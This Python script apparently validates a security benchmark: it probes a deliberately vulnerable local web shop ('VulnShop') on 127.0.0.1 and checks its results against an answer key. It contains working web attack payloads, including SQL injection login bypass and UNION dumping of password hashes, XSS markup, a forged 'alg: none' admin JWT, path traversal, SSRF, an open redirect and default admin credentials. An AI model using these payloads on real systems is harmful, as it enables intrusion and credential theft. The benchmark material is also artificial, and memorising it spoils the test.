#!/usr/bin/env python3
"""Check VulnShop against its ground truth.

Talks only to 127.0.0.1. Run `python -m vulnshop` first (default port 5050).
Each vulnerable item passes when its probe works AND data/oracle.jsonl gains a line with that ID.
Each safe control passes when its probe fails AND oracle.jsonl gains no line at all.
"""
import argparse
import base64
import http.client
import json
import re
import secrets
import sys
import tomllib
from pathlib import Path
from urllib.parse import quote

HERE = Path(__file__).resolve().parent
ORACLE = HERE / "data" / "oracle.jsonl"
DEFAULT_KEY = HERE / "safetywebbing" / "benchmark" / "targets" / "vulnshop.toml"

# Vulnerability ID -> answer-key entry id.
VULNS = {
    "V01": "vs-sqli-login",
    "V02": "vs-sqli-search-union",
    "V03": "vs-xss-reflected",
    "V04": "vs-xss-stored-comment",
    "V05": "vs-bac-order-idor",
    "V06": "vs-bac-admin-users",
    "V07": "vs-bac-mass-assignment",
    "V08": "vs-auth-token-none",
    "V09": "vs-path-traversal-download",
    "V10": "vs-ssrf-fetch",
    "V11": "vs-open-redirect",
    "V12": "vs-auth-default-admin",
    "V13": "vs-info-stack-trace",
    "V14": "vs-crypto-md5",
}
SAFE = {
    "S01": "vs-safe-search-api",
    "S02": "vs-safe-search-page",
    "S03": "vs-safe-comments",
    "S04": "vs-safe-orders",
    "S05": "vs-safe-admin-users",
    "S06": "vs-safe-download",
    "S07": "vs-safe-redirect",
    "S08": "vs-safe-login",
}
OUT_OF_CAPABILITY = {"V14"}

# Fixed fake credentials from the seed (see vulnshop/store.py).
CAROL_V2_PASSWORD = "Ub9^wG3oRl5-Ck1xZp7tJa4m"
MARKUP = '<i data-probe="vs">x</i>'
SQLI_UNION = "zzz' UNION SELECT id, username, password FROM users--"


class Client:
    def __init__(self, port):
        self.port = port

    def call(self, method, path, json_body=None, token=None, raw_token=None):
        headers = {}
        body = None
        if json_body is not None:
            body = json.dumps(json_body)
            headers["Content-Type"] = "application/json"
        if token or raw_token:
            headers["Authorization"] = "Bearer " + (raw_token or token)
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=10)
        try:
            conn.request(method, path, body=body, headers=headers)
            reply = conn.getresponse()
            text = reply.read().decode("utf-8", "replace")
            return reply.status, dict(reply.getheaders()), text
        finally:
            conn.close()

    def json(self, *args, **kwargs):
        status, headers, text = self.call(*args, **kwargs)
        try:
            return status, json.loads(text)
        except ValueError:
            return status, None


def oracle_lines():
    if not ORACLE.exists():
        return []
    return [json.loads(line) for line in ORACLE.read_text().splitlines() if line.strip()]


def b64(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b"=").decode()


def forged_token(sub):
    return f"{b64({'alg': 'none', 'typ': 'JWT'})}.{b64({'sub': sub, 'uid': 1, 'role': 'admin'})}."


class Session:
    def __init__(self, client):
        self.c = client
        tag = secrets.token_hex(4)
        self.attacker = self._register(f"probe_{tag}_a")
        self.fresh = self._register(f"probe_{tag}_b")

    def _register(self, name):
        password = secrets.token_urlsafe(18)
        status, _ = self.c.json("POST", "/api/register", {"username": name, "password": password})
        assert status == 201, f"registration failed: {status}"
        status, body = self.c.json("POST", "/login", {"username": name, "password": password})
        assert status == 200, f"login failed: {status}"
        return {"name": name, "password": password, "token": body["token"]}

    def carol_v2_token(self):
        status, body = self.c.json("POST", "/v2/login", {"username": "carol", "password": CAROL_V2_PASSWORD})
        assert status == 200, "seeded v2 login failed (run reset.py?)"
        return body["token"]


# ---- vulnerable probes: return True when the weakness was exercised --------

def v01(s):
    status, body = s.c.json("POST", "/login", {"username": "admin'--", "password": "x"})
    return status == 200 and body["user"]["username"] == "admin"


def v02(s):
    status, body = s.c.json("GET", "/api/search?q=" + quote(SQLI_UNION))
    return status == 200 and any(r["name"] == "admin" and re.fullmatch(r"[0-9a-f]{32}", str(r["price"])) for r in body)


def v03(s):
    status, _, text = s.c.call("GET", "/search?q=" + quote(MARKUP))
    return status == 200 and MARKUP in text


def v04(s):
    status, _ = s.c.json("POST", "/api/comments", {"product_id": 2, "body": MARKUP}, token=s.attacker["token"])
    _, _, page = s.c.call("GET", "/product/2")
    return status == 201 and MARKUP in page


def v05(s):
    status, body = s.c.json("GET", "/api/orders/1", token=s.attacker["token"])
    return status == 200 and body["user_id"] == 2


def v06(s):
    status, body = s.c.json("GET", "/api/admin/users", token=s.attacker["token"])
    return status == 200 and any(u["username"] == "admin" for u in body)


def v07(s):
    token = s.fresh["token"]
    status, _ = s.c.json("PUT", "/api/profile", {"role": "admin"}, token=token)
    _, body = s.c.json("GET", "/api/profile", token=token)
    return status == 200 and body["role"] == "admin"


def v08(s):
    status, body = s.c.json("GET", "/api/admin/users", raw_token=forged_token("admin"))
    return status == 200 and any(u["username"] == "admin" for u in body)


def v09(s):
    status, _, text = s.c.call("GET", "/download?file=" + quote("../secret/decoy-passwd.txt"))
    return status == 200 and "decoy" in text


def v10(s):
    url = quote(f"http://127.0.0.1:{s.c.port + 1}/internal/config", safe="")
    status, body = s.c.json("GET", "/api/fetch?url=" + url)
    return status == 200 and "warehouse" in body["body"]


def v11(s):
    status, headers, _ = s.c.call("GET", "/redirect?next=" + quote("http://example.invalid/"))
    return status in (301, 302, 303, 307, 308) and headers.get("Location", "").startswith("http://example.invalid")


def v12(s):
    status, body = s.c.json("POST", "/login", {"username": "admin", "password": "admin123"})
    return status == 200 and body["user"]["role"] == "admin"


def v13(s):
    status, _, text = s.c.call("GET", "/api/products/not-a-number")
    return status == 500 and "Traceback (most recent call last)" in text


def v14_static():
    text = (HERE / "vulnshop" / "store.py").read_text()
    app = (HERE / "vulnshop" / "app.py").read_text()
    return "hashlib.md5" in text and "store.hash_password(password)" in app


VULN_PROBES = {
    "V01": v01, "V02": v02, "V03": v03, "V04": v04, "V05": v05, "V06": v06, "V07": v07,
    "V08": v08, "V09": v09, "V10": v10, "V11": v11, "V12": v12, "V13": v13,
}


# ---- safe controls: return True when the exploit attempt FAILED ------------

def s01(s):
    status, body = s.c.json("GET", "/api/v2/search?q=" + quote(SQLI_UNION))
    return status == 200 and body == []


def s02(s):
    status, _, text = s.c.call("GET", "/v2/search?q=" + quote(MARKUP))
    return status == 200 and MARKUP not in text and "&lt;i data-probe" in text


def s03(s):
    token = s.carol_v2_token()
    status, _ = s.c.json("POST", "/api/v2/comments", {"product_id": 2, "body": MARKUP}, token=token)
    _, _, page = s.c.call("GET", "/v2/product/2")
    return status == 201 and MARKUP not in page and "&lt;i data-probe" in page


def s04(s):
    token = s.carol_v2_token()
    foreign, _ = s.c.json("GET", "/api/v2/orders/1", token=token)
    own, _ = s.c.json("GET", "/api/v2/orders/3", token=token)
    forged, _ = s.c.json("GET", "/api/v2/orders/1", raw_token=forged_token("alice"))
    return foreign == 404 and own == 200 and forged == 401


def s05(s):
    token = s.carol_v2_token()
    plain, _ = s.c.json("GET", "/api/v2/admin/users", token=token)
    forged, _ = s.c.json("GET", "/api/v2/admin/users", raw_token=forged_token("admin"))
    legacy_user, _ = s.c.json("GET", "/api/v2/admin/users", token=s.attacker["token"])
    return plain == 403 and forged == 401 and legacy_user == 403


def s06(s):
    blocked, _, _ = s.c.call("GET", "/v2/download?file=" + quote("../secret/decoy-passwd.txt"))
    absolute, _, _ = s.c.call("GET", "/v2/download?file=" + quote("/etc/passwd"))
    allowed, _, _ = s.c.call("GET", "/v2/download?file=readme.txt")
    return blocked == 404 and absolute == 404 and allowed == 200


def s07(s):
    results = []
    for target in ("http://example.invalid/", "//example.invalid/", "/\\example.invalid"):
        status, headers, _ = s.c.call("GET", "/v2/redirect?next=" + quote(target))
        results.append(status in (301, 302, 303, 307, 308) and headers.get("Location") == "/")
    _, headers, _ = s.c.call("GET", "/v2/redirect?next=/search")
    return all(results) and headers.get("Location") == "/search"


def s08(s):
    injected, _ = s.c.json("POST", "/v2/login", {"username": "admin'--", "password": "x"})
    default, _ = s.c.json("POST", "/v2/login", {"username": "admin", "password": "admin123"})
    good, _ = s.c.json("POST", "/v2/login", {"username": "carol", "password": CAROL_V2_PASSWORD})
    return injected == 401 and default == 401 and good == 200


SAFE_PROBES = {
    "S01": s01, "S02": s02, "S03": s03, "S04": s04, "S05": s05, "S06": s06, "S07": s07, "S08": s08,
}


def cross_check(key_path, required):
    if not key_path.exists():
        if required:
            return [f"answer key not found: {key_path}"]
        print(f"note: answer key {key_path} not found, skipping ID cross-check")
        return []
    data = tomllib.loads(key_path.read_text(encoding="utf-8"))
    entries = data.get("vuln", [])
    problems = []
    safe_ids = {e["id"] for e in entries if e.get("expect") == "safe"}
    vuln_ids = {e["id"] for e in entries if e.get("expect") != "safe"}
    if vuln_ids != set(VULNS.values()):
        problems.append(f"vulnerable ids differ: {sorted(vuln_ids ^ set(VULNS.values()))}")
    if safe_ids != set(SAFE.values()):
        problems.append(f"safe ids differ: {sorted(safe_ids ^ set(SAFE.values()))}")
    by_id = {e["id"]: e for e in entries}
    for vid, entry_id in VULNS.items():
        entry = by_id.get(entry_id, {})
        keys = {o.get("key") for o in entry.get("oracles", []) if o.get("kind") == "file_oracle"}
        if vid in OUT_OF_CAPABILITY:
            if entry.get("scoring") != "out_of_capability":
                problems.append(f"{entry_id} must be scoring=out_of_capability")
        elif vid not in keys:
            problems.append(f"{entry_id} lacks file_oracle key {vid}")
    return problems


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--port", type=int, default=5050)
    parser.add_argument("--answer-key", type=Path, help="path to vulnshop.toml (default: bundled draft)")
    args = parser.parse_args()

    client = Client(args.port)
    try:
        session = Session(client)
    except (OSError, AssertionError) as exc:
        print(f"cannot reach VulnShop on 127.0.0.1:{args.port}: {exc}", file=sys.stderr)
        return 2

    rows = []
    for vid, probe in VULN_PROBES.items():
        before = len(oracle_lines())
        worked = probe(session)
        logged = {line["id"] for line in oracle_lines()[before:]}
        rows.append((vid, "PASS" if worked and vid in logged else "FAIL",
                     "exploited + oracle" if worked and vid in logged else f"worked={worked} oracle={sorted(logged)}"))
    rows.append(("V14", "PASS" if v14_static() else "FAIL", "CODE-ONLY (static check)"))
    for sid, probe in SAFE_PROBES.items():
        before = len(oracle_lines())
        held = probe(session)
        extra = oracle_lines()[before:]
        rows.append((sid, "PASS" if held and not extra else "FAIL",
                     "payload rejected, no oracle" if held and not extra else f"held={held} oracle={[l['id'] for l in extra]}"))

    for row in rows:
        print(f"{row[0]}  {row[1]}  {row[2]}")

    http_pass = sum(1 for r in rows if r[0] in VULN_PROBES and r[1] == "PASS")
    code_pass = sum(1 for r in rows if r[0] == "V14" and r[1] == "PASS")
    safe_pass = sum(1 for r in rows if r[0] in SAFE_PROBES and r[1] == "PASS")
    key_path = args.answer_key or DEFAULT_KEY
    problems = cross_check(key_path, required=args.answer_key is not None)
    ok = http_pass == 13 and code_pass == 1 and safe_pass == 8 and not problems
    print()
    if ok:
        suffix = "totals match the answer key" if key_path.exists() else "answer key not cross-checked"
        print(f"14 vulnerable (13 exploitable over HTTP + 1 code-only), 8 safe, {suffix}")
        return 0
    print(f"MISMATCH: http={http_pass}/13 code={code_pass}/1 safe={safe_pass}/8")
    for problem in problems:
        print(f"  - {problem}")
    return 1


if __name__ == "__main__":
    sys.exit(main())
